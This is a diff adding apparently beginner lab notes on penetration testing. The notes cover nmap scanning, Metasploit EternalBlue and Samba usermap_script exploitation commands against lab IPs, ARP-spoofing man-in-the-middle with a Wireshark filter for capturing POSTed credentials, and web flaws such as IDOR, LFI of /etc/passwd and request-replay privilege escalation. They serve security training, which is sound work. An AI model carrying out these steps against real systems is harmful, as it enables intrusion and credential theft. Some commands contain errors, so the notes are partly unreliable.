@@ -1,0 +1,228 @@
+Port Scanning
+---------------------------------------------------------------------------------
+A port scan is a method for determining which ports on a network are
+open. As ports on a computer are the place where information is sent
+and received, port scanning is analogous to knocking on doors to see if
+someone is home.Recommend to turn off the firewall of the target
+machine to detect the open ports.
+
+Nmap:- Nmap is a network scanner created by Gordon Lyon. Nmap is
+used to discover hosts and services on a computer network by sending
+packets and analyzing the responses. Nmap provides a number of
+features for probing computer networks, including host discovery and
+service and operating system detection.
+
+
+nmap -sV ipaddress
+sV: provides the type of service given by the ports
+Note : output available in snapshots folder
+
+
+nmap -p ipaddress
+p: specifies the range of open ports
+
+
+nmap -p 100–200 ipaddress
+Its defines that display the open ports from the range 100–200
+
+
+
+Attack onWindows 7
+---------------------------------------------------------------------------------
+Step 1: Scan the open ports of the Victim machine
+Use the Nmap tool to scan the open Ports
+
+Step 2: Scan the Vulnarabilites of Victim machine using the Nessus Tool
+
+Step 3:Identify the Vulnarabilities like RISK,HIGH,MEDIUM
+Step 4: Use metasploitable tool service
+Step 5: Run the msfdb service to initiate the Database
+Step 6: Jump to Terminal called msdconsole to perform the
+Exploitation
+Step 7: Use the exploit of eternalblue to execute vulnarability using the
+CVE code of the Vulnarability
+Step 8: Goto show option and set the target machine and verify the port
+that has vulanrability
+
+type below commands to perform the exploit
+--------------------------------------------
+
+search eternalblue
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+set HOSTS 192.168.43.45
+
+exploit
+
+
+Step 9: Give the command called exploit to attack the Victim machine
+through the vulnarabilities.
+
+After the Successfull attack you can execute the basic commands and
+also able to control the target machine.
+
+--------------------------------------------------------------------------------------------------
+
+
+Sniffing
+
+
+Its is a process of monitoring and capturing all data packets
+passing through given network. Sniffers are used by network/system
+administrator to monitor and troubleshoot network traffic. Attackers
+use sniffers to capture data packets containing sensitive information
+such as password, account information.
+
+
+Why we use Sniffing
+Sniffers are used by network/system administrator to monitor and
+troubleshoot network traffic
+Sample Sniffing by Capturing the user credentials like username and
+passwords
+
+
+WireShark:Wireshark is a packet sniffer and analysis tool. It captures
+network traffic on the local network and stores that data for offline
+analysis. Wireshark captures network traffic from Ethernet, Bluetooth,
+Wireless (IEEE. 802.11), Token Ring, Frame Relay connections, and
+more.
+
+
+Ettercap: Ettercap is a free and open source network security tool for
+man-in-the-middle attacks on LAN. It can be used for computer
+network protocol analysis and security auditing. It runs on various
+Unix-like operating systems including Linux, Mac OS X, BSD and
+Solaris, and on Microsoft Windows.
+
+GateWay: A computer that sits between different networks or
+applications. The gateway converts information, data or other
+communications from one protocol or format to another. A router may
+perform some of the functions of a gateway.
+
+
+
+
+Steps To perform the sniffing:
+Step 1: Identify the target system and its Gateway
+Step 2 : Open the Wireshark run the ET0 and click to capture the traffic
+Step 3: Open the Ettercap tool and set up the target and gateway by
+scanning the available hosts.
+Step 4: Apply the MIMA Man in middle attack after setuping the target
+Step 5: After this mac address of attacker machine and mac address of
+victim gateways will turn to same. 
+
+type arp -a
+
+
+Step 6: Open any kind of website to give the credentials
+Step 7: open the Wireshark and filter the packets by appropiate
+protocal and request method
+
+type on search bar of wiredshark to get the credentials recorded.
+http&&ip.src==192.168.43.41&&http.request_method=='POST'
+
+
+
+----------------------------------------------------------
+
+
+OWASP—Open Web Application Security Project
+They identify and publich top 10 conceptual reasons why websites get
+hacked
+
+BurpSuite
+----------------------
+Burp Suite is an integrated platform/graphical tool for performing
+security testing of web applications. Its various tools work seamlessly
+together to support the entire testing process, from initial mapping and
+analysis of an application’s attack surface, through to finding and
+exploiting security vulnerabilities
+
+Tab of Burpsuite:-
+Target :- Shows the websites/ requests/ data of all the web pages
+visited.
+
+Proxy:- Toggle manual interceptions / view logged requests
+Intruder:- Fuzzing, try various input inside the parameter to check
+how the app responds to the requests
+
+Repeater:- We could manually change each & every parameter of the
+request and observe the response
+
+Decoder:- Used for encoding / decoding data
+
+
+Broken Access Control:- (The Web app doesnot differentiate you
+between the roles / permissions)
+You’ll be able to view / access the data which we are not supposed to
+view / access legaly / rightfully
+
+IDOR Indirect Object References :-
+If a object / data is referred with a numerical id or commonly useable
+text(name, number, some common text) so if an unprivileged user tries
+to modify the id, he’ll be able to see it.
+Simple Example on tracking the credentials of the website and testing
+the security of the website using the Burpsuite
+
+
+LFI Local File Inclusions :-
+When apps allow to view certain system files without any restriction, by
+this attack we could access the entire system files.
+Bypass a Path Based Access Control Scheme
+/etc/passwd // Is existing in all unix based machine, it is viewable to all
+users displays the configuration information about user credentials
+
+
+
+Privilege Escalation
+Its an attack where one user is able to steal/modify/delete data of
+another user
+Horizontal Escalation:-User is able to edit / access data of a similar
+role user
+Guest : Guest / User : User : Administrator : Administrator
+Vertical Escalation:- User is able to edit / access data of a higher role
+user
+
+Steps to perform Privilege Escalation:-
+1. Login as , perform an unique operation for that profile
+2. Record that request body and keep a backup
+3. Logout from
+4. Login as User 2 (Larry)
+5. Create a dummy request of User 2
+6. Replay the recorded request body by pasting the recorded data
+7. Cross verify if the changes have been madeLogin to and check if the
+changes have been made.
+------------------------------------------------------------
+
+Attack On Linux system
+---------------------------------------------
+
+Unix is an operating system. It supports multitasking and multiuser functionality. Unix is most widely used in all forms of computing
+systems such as desktop, laptop, and servers. On Unix, there is a
+Graphical user interface similar to windows that support easy
+navigation and support environment
+Steps to exploit:
+1. Identify Open Ports / Port Scanning :To identify open ports &
+information about the services on the victim machine
+2. Identify Known Vulnerability / Vulnerability Scanning :To
+identify known vulnerabilities on the victim machine
+3. Exploit: Utilize the identified vulnerability to work in the favour of
+the attacker
+
+--------------------------------------------------------
+Commands used in order:
+1. nmap -sV 192.168.43.45
+
+1. msfdb init
+2. service postgresql start
+3. msfconsole
+4. search samba 3.0.20
+5. use exploit/multi/samba/usermap_script
+6. info exploit/multi/samba/usermap_script
+7. set RHOSTS 192.168.43.41
+8. exploit
+10. type any linux commands or create directory to test it
+
+
+
